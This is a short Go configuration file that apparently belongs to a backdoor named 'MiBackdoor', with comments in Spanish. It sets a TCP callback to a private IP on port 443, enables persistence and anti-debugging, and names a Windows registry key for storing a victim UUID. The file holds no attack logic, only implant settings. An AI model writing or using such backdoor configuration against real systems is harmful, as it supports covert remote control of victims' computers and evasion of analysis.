package config


const (
    Host              = "192.168.148.136"
    Port              = "443"
    Mode              = "tcp"
    EnablePersistence = true
    AntiDebug         = true

    // Clave y valor en el registro donde guardamos el UUID
    RegKeyPath = `Software\MiBackdoor`
	RegValue   = "UUID"
)

// UUID se carga al arrancar (si ya había uno) o se actualiza con PersistUUID.
var UUID string
